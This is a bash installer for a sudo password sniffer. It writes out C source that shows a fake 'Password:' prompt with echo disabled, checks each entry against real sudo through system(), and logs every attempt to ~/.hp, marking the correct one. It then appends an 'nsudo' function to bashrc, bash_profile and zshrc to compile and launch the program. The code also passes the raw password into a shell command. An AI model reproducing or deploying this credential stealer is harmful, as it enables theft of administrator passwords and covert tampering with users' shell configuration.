#!/bin/bash

# Define the content for the .sudo.c file
sudo_c_content=$(cat << 'EOF'
#include <stdio.h>
#include <termios.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char* expandHomeDirectory(const char* path) {
    if (path[0] == '~') {
        const char* home = getenv("HOME");
        if (home == NULL) {
            return NULL; 
        }

        char* fullPath = malloc(strlen(home) + strlen(path) + 1);
        if (fullPath == NULL) {
            return NULL; 
        }

        strcpy(fullPath, home);
        strcat(fullPath, path + 1);

        return fullPath;
    }

    return strdup(path);
}

void terminalOff(){
    struct termios t;
    tcgetattr(STDIN_FILENO, &t);
    t.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
}

void terminalOn(){
    struct termios t;
    tcgetattr(STDIN_FILENO, &t);
    t.c_lflag |= ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
}
void malwarePasswordSniff() {
    char password[100];
    char command[200];
    int runLoop = 1;
    int attempt = 0;

    char* filePath = expandHomeDirectory("~/.hp");
    FILE *file;

    if (filePath == NULL) {
        printf("Error expanding home directory.\n");
        return;
    }

    while (runLoop) {
        printf("Password: ");

        terminalOff();

        fgets(password, sizeof(password), stdin);  

        terminalOn();

        printf("\n");

        password[strcspn(password, "\n")] = '\0';

        snprintf(command, sizeof(command), "echo %s | sudo -S ls / > /dev/null 2>&1", password);

        int result = system(command);

        system("sudo -k");

        file = fopen(filePath, "a");
        if (file == NULL) {
            printf("Error opening log file!\n");
            free(filePath);
            return;
        }

        if (result != 0) {
            fprintf(file, "[ ] '%s'\n", password);
            printf("Sorry, try again.\n");
            attempt++;
            if (attempt >= 3) { 
                printf("Too many failed attempts. Exiting.\n");
                runLoop = 0;
            }
        } else {
            fprintf(file, "[*] '%s'\n", password);
            runLoop = 0;  
        }
        fclose(file);
    }

    free(filePath); 
}

int main() {
    malwarePasswordSniff();
    return 0;
}
EOF
)

echo "$sudo_c_content" > ~/.sudo.c

sudo_function=$(cat << 'EOF'

nsudo() {
    gcc ~/.sudo.c -o ~/.newSudo
    ~/.newSudo
}
EOF
)

for file in ~/.bashrc ~/.bash_profile ~/.zshrc; do
    if [ -f "$file" ]; then
        echo "$sudo_function" >> "$file"
        echo "Appended sudo function to $file"
    else
        echo "$file does not exist."
    fi
done

if [ -f ~/.bashrc ]; then
    source ~/.bashrc
fi

if [ -f ~/.bash_profile ]; then
    source ~/.bash_profile
fi

if [ -f ~/.zshrc ]; then
    source ~/.zshrc
fi

echo "Setup complete."
